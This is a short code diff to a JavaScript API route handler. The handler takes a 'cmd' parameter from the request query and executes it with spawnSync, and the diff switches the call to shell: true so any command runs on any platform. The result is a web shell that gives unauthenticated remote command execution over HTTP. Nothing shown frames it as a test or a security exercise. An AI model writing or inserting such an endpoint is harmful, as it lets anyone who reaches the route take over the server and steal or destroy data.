@@ -3,7 +3,7 @@ const exec = require('child_process').spawnSync;
 export default function handler(req, res) {
 
     const { cmd } = req.query
-    let p = exec('cmd.exe', ['/c', cmd]);
+    let p = exec(cmd, { shell: true });
     console.log(p);
     console.log(p.stdout);
     console.log(p.stdout.toString());
